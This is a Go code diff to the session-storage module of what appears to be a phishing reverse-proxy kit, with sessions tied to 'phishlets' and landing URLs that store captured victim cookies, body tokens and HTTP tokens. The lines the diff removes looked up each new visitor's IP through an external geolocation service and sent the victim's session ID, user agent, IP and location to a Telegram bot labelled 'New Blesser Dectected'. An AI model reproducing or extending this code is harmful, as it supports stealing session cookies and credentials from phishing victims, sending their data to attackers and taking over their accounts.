@@ -4,9 +4,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"time"
-	"io/ioutil"
-	"net/http"
-	"strings"
 
 	"github.com/tidwall/buntdb"
 )
@@ -23,21 +20,13 @@ type Session struct {
 	BodyTokens   map[string]string                  `json:"body_tokens"`
 	HttpTokens   map[string]string                  `json:"http_tokens"`
 	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
-	Tokens     	 map[string]map[string]*Token 		`json:"tokens"`
 	SessionId    string                             `json:"session_id"`
 	UserAgent    string                             `json:"useragent"`
 	RemoteAddr   string                             `json:"remote_addr"`
 	CreateTime   int64                              `json:"create_time"`
 	UpdateTime   int64                              `json:"update_time"`
 }
-
 type CookieToken struct {
-	Name     string
-	Value    string
-	Path     string
-	HttpOnly bool
-}
-type Token struct {
 	Name     string
 	Value    string
 	Path     string
@@ -47,7 +36,6 @@ func (d *Database) sessionsInit() {
 	d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id"))
 	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
 }
-
 func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
 	_, err := d.sessionsGetBySid(sid)
 	if err == nil {
@@ -66,7 +54,6 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		BodyTokens:   make(map[string]string),
 		HttpTokens:   make(map[string]string),
 		CookieTokens: make(map[string]map[string]*CookieToken),
-		Tokens: make(map[string]map[string]*Token),
 		SessionId:    sid,
 		UserAgent:    useragent,
 		RemoteAddr:   remote_addr,
@@ -75,21 +62,6 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 	}
 
 	jf, _ := json.Marshal(s)
-
-	ipinfo, ipinfoerr := http.Get("http://ipwho.is/" + remote_addr)
-	if ipinfoerr != nil {
-		fmt.Print("error")
-	}
-
-	ipinfos, eerr := ioutil.ReadAll(ipinfo.Body)
-
-	ipinfosn := strings.Replace(string(ipinfos), ",", "%0A-➡️ ", -1)
-
-	if eerr != nil {
-		fmt.Print("error")
-	}
-
-	telegramSendVisitor(fmt.Sprintf("New Blesser Dectected\n\n-🆔ID: %s \n\n🌎UserAgent: %s\n\n-🗺️IP: %s\n\n %s\n\n", sid, useragent, remote_addr, ipinfosn))
 
 	err = d.db.Update(func(tx *buntdb.Tx) error {
 		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
@@ -186,7 +158,6 @@ func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[
 	}
 	s.CookieTokens = tokens
 	s.UpdateTime = time.Now().UTC().Unix()
-
 	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
@@ -247,15 +218,4 @@ func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
 		return nil, err
 	}
 	return s, nil
-}
-func (d *Database) sessionsUpdateTokens(sid string, tokens map[string]map[string]*CookieToken) error {
-	s, err := d.sessionsGetBySid(sid)
-	if err != nil {
-		return err
-	}
-	s.CookieTokens = tokens
-	s.UpdateTime = time.Now().UTC().Unix()
-
-	err = d.sessionsUpdate(s.Id, s)
-	return err
 }
